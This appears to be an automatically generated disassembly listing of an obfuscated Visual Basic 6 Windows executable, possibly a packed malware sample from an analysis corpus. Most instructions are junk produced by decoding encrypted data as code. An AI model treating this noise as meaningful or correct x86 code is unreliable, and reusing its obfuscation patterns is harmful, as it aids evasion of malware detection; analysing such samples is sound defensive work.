or [ ebx + 0x547fcd3a ] 0x3c
mov [ 0xffffffffbeb95b7f ] al
and edi [ edi - 0x43 ]
mov esi 0x36bd7f3b
cmp edi [ edi - 0x4f ]
jbe r-xdata
mov ecx 0x46312f35
0x3b2a
dec esi
xchg edx eax
cli
mov ch 0x44
cdq
int3
cwde
mov dh 0xb1
std
pop ebx
mov ecx 0x160ff35
inc eax
sub_453e4c
fadd st2
xor al 0x7f
push ebp
mov ch 0x4
pop esi
add eax [ eax - 0x67 ]
shr dl 0x1
xor edi esp
cwde
mov bl 0x4
mov dh 0xe3
mov eax 0xf85b7f35
jbe r-xdata
pop edx
jle r-xdata
dec eax
int3
mov ecx 0x796aad40
imul [ ebx + 0x5b ]
xor dh [ ecx + 0x5b ]
pop edi
xor ch [ ecx + 0x5b ]
push ebx
xor esp [ 0x76f948f7 ]
fild [ ecx + 0x7baf0a35 ]
cmp eax 0x2d183f7f
jg r-xdata
jpe r-xdata
movsb [ edi ] [ esi ]
inc esi
sbb bh [ ecx + ebp ]
fcom [ ebx + ecx + 0x3e ]
cdq
sbb ch [ eax + ebx ]
cdq
jge r-xdata
mov ecx 0x396b3fbe
xor al 0x6b
mov ecx 0xead27f35
xor edi [ edi ]
fdivr [ eax + 0x3f ]
cld
cwde
mov bl 0xb4
xchg [ ebx - 0x67 ] bl
xor eax 0xf7262e7f
imul ebx [ ebx + 0x32 ] 0x69
pop es
0xce2f195a 0xd54
push cs
jmp r-xdata
dec edx
je r-xdata
mov [ 0x29240bb ] al
cmp [ esi ] ecx
pop ebx
pop edi
xor dh [ ecx + 0x5b ]
pop edi
mov edx 0xfa535b71
or al 0xbc
das
div [ ebp - 0x3c331cbc ]
cld
and [ eax + 0x39ab0a35 ] bh
dec esi
jpe r-xdata
int3
jpo r-xdata
fadd [ edi + 0xb ]
leave
adc eax 0x17c03e34
and edi [ ecx - 0x65 ]
adc eax 0x1a993d50
or edi [ ebx - 0x15 ]
jo r-xdata
pop ebx
add al 0xea
outsd
pop edi
je r-xdata
pop ebp
pop es
fwait
pop ss
sub al 0x2f
adc eax 0x179b075d
jg r-xdata
xor al 0xdf
inc ecx
and ecx [ eax + edx * 8 ]
pop ebx
sbb esi [ esi + ecx * 8 ]
inc esi
and ebx [ eax ]
int3
popad
int3
sub_453ea4
and [ edx + ecx * 8 - 0x4352d161 ] bh
cmp al 0x5a
jle r-xdata
mov ecx 0x796aad40
imul [ ebx + 0x5b ]
xor dh [ ecx + 0x5b ]
pop edi
xor ch [ ecx + 0x5b ]
push ebx
xor esp [ 0x76f948f7 ]
fild [ ecx + 0x7baf0a35 ]
cmp eax 0x2d183f7f
jg r-xdata
jpe r-xdata
movsb [ edi ] [ esi ]
inc esi
sbb bh [ ecx + ebp ]
fcom [ ebx + ecx + 0x3e ]
cdq
sbb ch [ eax + ebx ]
cdq
jge r-xdata
mov ecx 0x396b3fbe
xor al 0x6b
mov ecx 0xead27f35
xor edi [ edi ]
fdivr [ eax + 0x3f ]
cld
cwde
mov bl 0xb4
xchg [ ebx - 0x67 ] bl
xor eax 0xf7262e7f
imul ebx [ ebx + 0x32 ] 0x69
pop es
0xce2f195a 0xd54
push cs
jmp r-xdata
dec edx
je r-xdata
mov [ 0x29240bb ] al
cmp [ esi ] ecx
pop ebx
pop edi
xor dh [ ecx + 0x5b ]
pop edi
mov edx 0xfa535b71
or al 0xbc
das
div [ ebp - 0x3c331cbc ]
cld
and [ eax + 0x39ab0a35 ] bh
dec esi
jpe r-xdata
int3
jpo r-xdata
fadd [ edi + 0xb ]
leave
adc eax 0x17c03e34
and edi [ ecx - 0x65 ]
adc eax 0x1a993d50
or edi [ ebx - 0x15 ]
jo r-xdata
pop ebx
add al 0xea
outsd
pop edi
je r-xdata
pop ebp
pop es
fwait
pop ss
sub al 0x2f
adc eax 0x179b075d
jg r-xdata
xor al 0xdf
inc ecx
and ecx [ eax + edx * 8 ]
pop ebx
sbb esi [ esi + ecx * 8 ]
inc esi
and ebx [ eax ]
int3
popad
int3
sub_453fce
push eax
push es
jns r-xdata
or al 0x75
fmul [ ebp + 0x1a ]
pop ebx
push ecx
bound eax [ esi + 0x3c1a46a4 ]
sub esp ebx
push esp
or edi [ esi ]
cdq
sbb ch [ eax + ebx ]
cdq
js r-xdata
sbb ch [ ebx ]
or [ ecx - 0x21c1f2e9 ] ebx
adc eax 0x15dd3f1e
pop ebp
adc esi edx
jns r-xdata
js r-xdata
adc eax 0x7b3a61ec
xchg esi eax
popad
xor [ ebx - 0x65 ] edi
or di [ edx ]

adc eax 0x179b075d
pop es
in eax 0x78
push ss
cmp bl cl
pop edx
or al 0x34
fild [ ecx + 0x23 ]
or al 0xd0
jpo r-xdata
pop ebx
add al 0xea
outsd
pop edi
je r-xdata
sub eax 0xbeb95b7f
aas
imul edi [ ecx ] 0xffffff8d
fistp [ ebx - 0x47 ]
xor eax 0x8dbf2e7a
jle r-xdata
pop es
pop edi
je r-xdata
sub al 0x2f
pop ebp
pop es
fwait
pop ss
adc eax 0x179b075d
jg r-xdata
push cs
jmp r-xdata
mov ecx 0x796abc35
not [ edi - 0x7f35bfe2 ]
or dl bl
pop ebp
sub edi [ edx ]
0xc5e
sub al 0x18
cdq
jge r-xdata
jpo r-xdata
pop ebx
sbb esi [ esi + ecx * 8 ]
inc esi
and ebx [ eax ]
int3
xor al 0xdf
inc ecx
and ecx [ eax + edx * 8 ]
popad
int3
jpo r-xdata
xor al 0x3e
rcl [ edi ] 0x23
jns r-xdata
jns r-xdata
fadd [ edi + 0xb ]
leave
adc eax 0x17c03e34
and edi [ ecx - 0x65 ]
jo r-xdata
0xcd291e41 0xf40
adc eax 0x1a993d50
or edi [ ebx - 0x15 ]
sbb [ ecx - 0x14f1cf83 ] bl
jns r-xdata
inc ecx
push ds
sub ebp ecx
inc eax
0xce2f195a 0xd54
adc eax 0x79f2135d
xor al [ edi ]
jpo r-xdata
pop ebx
mov ecx 0xbf2e7a35
lea edi [ esi + 0x5b ]
sub_45406e
xor eax 0x35975b4f
cmp ebx [ ebx - 0xb ]
xor eax 0x33515b33
xchg edx eax
movsb [ edi ] [ esi ]
inc esi
je r-xdata
inc esi
pop ebx
push ecx
pop esi
xchg esi eax
movsb [ edi ] [ esi ]
inc esi
inc eax
or edi [ ecx - 0x46e0809b ]
je r-xdata
or al 0x3e

ud1 esi [ edi + edi * 2 + 0x66 ]
mov ecx 0x4eb37f35
fld [ eax + 0x3a35eda4 ]
pop ebx
hlt
sub_4540e5
fisttp [ ecx + edx * 2 ]
aas
aad 0x59
jg r-xdata
pop ebx
push ecx
push ebp
xchg ebp eax
movsb [ edi ] [ esi ]
inc esi
xor eax 0x35b95b7f
jg r-xdata
jno r-xdata

mov ecx 0xb95b7f20
xor al 0x7f
pop ebx
mov ecx 0xb95b7f35
xor eax 0x34b95b7f
jg r-xdata
jg r-xdata
and [ ebp + edi * 8 - 0x25c1f2a4 ] 0x41
dec esp
pop ds
cli
inc edi
sbb bh [ edx ]
int 0x50
inc esi
pop ebx
push ecx
pop esi
xchg esi eax
movsb [ edi ] [ esi ]
inc esi
inc eax
or al 0x3e

or al 0xd0
pop ebx
sbb esi [ esi + ecx * 8 ]
inc esi
jg r-xdata
mov ecx 0xb95b7f35
xor al 0x7f
pop ebx
mov ecx 0xb95b7f34
jg r-xdata
movsb [ edi ] [ esi ]
std
push eax
or al 0x2f
mov ecx 0xb95b7f65
xor eax 0x35b95b7f
jg r-xdata
pop ebx

xchg edi eax
fadd [ eax + 0xc50fda4 ]
das
mov ecx 0xb95b7f35
xor eax 0x35b95b7f
jg r-xdata
xor al 0xce
xor eax 0xca501a97
mov ecx 0xb95b7f35
sbb [ esp + ebx * 8 ] 0x41
cmp edi [ esi ]
0xb5e
sbb dl [ eax - 0x36 ]
mov ecx 0x46b2afdd
0x681b
sub_45410a
push es
dec ebp
pop ebx
push ecx
bound edx [ edx + 0x117046a4 ]
aam 0x61
pop ss
sub esp ebx
push esp
sbb ecx [ eax + edx * 8 ]
pop ebx
sbb esi [ esi + ecx * 8 ]
inc esi
jg r-xdata
pop ebx
mov ecx 0xb95b7f35
xchg edi eax
fadd [ eax + 0xc50fda4 ]
das

sub_4541a0
sub ebx ecx
pop edx
or eax 0x96f5515b
movsb [ edi ] [ esi ]
inc esi
sbb ch [ edi ]
cld
inc edi
or eax 0x1078cb34
aas
fdiv [ 0xffffffffca53b797 ]
or [ 0x2e0b47d0 ] 0xd8
pop ecx
aaa
aad 0x5a
sbb al 0x1e
shl [ 0xffffffffca53c997 ] 0x80
or eax 0x2e0b47d0
fcomp [ ecx + 0x2f ]
sub esi edx
inc ecx
sbb bh [ eax ]
int 0x70
pop es
pop ebx
push ecx
and edx [ ebp + 0xd7646a4 ]
fadd [ ecx + 0x1a ]
sbb eax 0x1a1a59d0
mov ecx 0x46b169dd
0x2928
sub_4541f9
rol [ ecx + 0x1a ] 0x1
sbb eax 0x5b1a59d0
push ecx
sbb al 0x95
movsb [ edi ] [ esi ]
inc esi
sbb bh [ bp + si ]
fnsave [ ebx + 0x16 ]
aaa
fdiv [ 0xffffffffca537797 ]
sbb [ esp + ebx * 8 ] 0x41
cmp [ edx ] esi
aad 0x50
sub al 0x32
retn
__vbaChkstk
jmp [ __vbaChkstk@IAT ]
__vbaExceptHandler
jmp [ __vbaExceptHandler@IAT ]
__vbaFPException
jmp [ __vbaFPException@IAT ]
_adj_fdiv_m16i
jmp [ _adj_fdiv_m16i@IAT ]
_adj_fdiv_m32
jmp [ _adj_fdiv_m32@IAT ]
_adj_fdiv_m32i
jmp [ _adj_fdiv_m32i@IAT ]
_adj_fdiv_m64
jmp [ _adj_fdiv_m64@IAT ]
_adj_fdiv_r
jmp [ _adj_fdiv_r@IAT ]
_adj_fdivr_m16i
jmp [ _adj_fdivr_m16i@IAT ]
_adj_fdivr_m32
jmp [ _adj_fdivr_m32@IAT ]
_adj_fdivr_m32i
jmp [ _adj_fdivr_m32i@IAT ]
_adj_fdivr_m64
jmp [ _adj_fdivr_m64@IAT ]
_adj_fpatan
jmp [ _adj_fpatan@IAT ]
_adj_fprem
jmp [ _adj_fprem@IAT ]
_adj_fprem1
jmp [ _adj_fprem1@IAT ]
_adj_fptan
jmp [ _adj_fptan@IAT ]
_CIatan
jmp [ _CIatan@IAT ]
_CIcos
jmp [ _CIcos@IAT ]
_CIexp
jmp [ _CIexp@IAT ]
_CIlog
jmp [ _CIlog@IAT ]
_CIsin
jmp [ _CIsin@IAT ]
_CIsqrt
jmp [ _CIsqrt@IAT ]
_CItan
jmp [ _CItan@IAT ]
_allmul
jmp [ _allmul@IAT ]
__vbaFreeVar
jmp [ __vbaFreeVar@IAT ]
__vbaFreeStr
jmp [ __vbaFreeStr@IAT ]
__vbaVarMove
jmp [ __vbaVarMove@IAT ]
Ordinal_MSVBVM60_534
jmp [ Ordinal_MSVBVM60_534@IAT ]
__vbaFreeVarList
jmp [ __vbaFreeVarList@IAT ]
__vbaVarDup
jmp [ __vbaVarDup@IAT ]
Ordinal_MSVBVM60_595
jmp [ Ordinal_MSVBVM60_595@IAT ]
Ordinal_MSVBVM60_685
jmp [ Ordinal_MSVBVM60_685@IAT ]
__vbaObjSet
jmp [ __vbaObjSet@IAT ]
__vbaFreeObj
jmp [ __vbaFreeObj@IAT ]
__vbaHresultCheckObj
jmp [ __vbaHresultCheckObj@IAT ]
__vbaNew2
jmp [ __vbaNew2@IAT ]
EVENT_SINK_QueryInterface
jmp [ EVENT_SINK_QueryInterface@IAT ]
EVENT_SINK_AddRef
jmp [ EVENT_SINK_AddRef@IAT ]
EVENT_SINK_Release
jmp [ EVENT_SINK_Release@IAT ]
Ordinal_MSVBVM60_100
jmp [ Ordinal_MSVBVM60_100@IAT ]
sub_401209
pop es
inc ecx
add [ eax ] al
add [ eax ] al
add bh bh
int3
sub_40196d
retn 0xff54
sub_4019f2
cld
inc ecx
hlt
sub_4036f4
mov esp 0x33ad4f3a
cdq
iret
sub_403754
jmp [ edx + ecx ]
sub_453b69
in eax dx
0x9bea
sub_4540df
scasd [ edi ]
mov dl 0x46
0x681b
sub_45412e
pop edx
push es
or al 0xd0
pop ebx
sbb esi [ esi + ecx * 8 ]
xor eax 0xca501a97
sbb [ esp + ebx * 8 ] 0x41
cmp edi [ esi ]
0xb5e
sub_454144
xor al 0xc9
bound edx [ esi ]
xor eax 0x5b085add
push ecx
0xa495
sub_454151
inc esi
pushad
adc [ esi ] esi
fadd [ ebp + 0x29 ]
xor bl ah
inc edx
xor [ 0x3e135cff ] bh
mov ecx 0x46b054dd
0xb36
sub_454270
mov bl 0x2
les eax [ eax + 0xb50fea4 ]
push ds
rcr [ ebx + ecx + 0x18 ] 0xd6
push ecx
sbb cl [ ebx ]

sub_454282
pop edx
sbb al 0x3e
0x7f46
sub_454288
mov bl 0x4e
fadd [ eax + 0xd50eda4 ]
rcr [ ss : ebx + 0x1e ] 0x1
das
fsub [ ebp + 0xd ]
xor al 0xda
push eax
or al 0x28
mov ecx 0x46aab1dd
0x3a28
sub_454538
0xa5c696af 0xad54
sub_454585
mov ecx 0x48359735
0x5b80
sub_456b5a
jmp [ edi + eax ]
sub_45a607
push ebp
mov ebp esp
push 0x8
pop eax
call __vbaChkstk
nop
mov ebx sub_45253d
call ebx
jmp 0xffffffffca45a61e
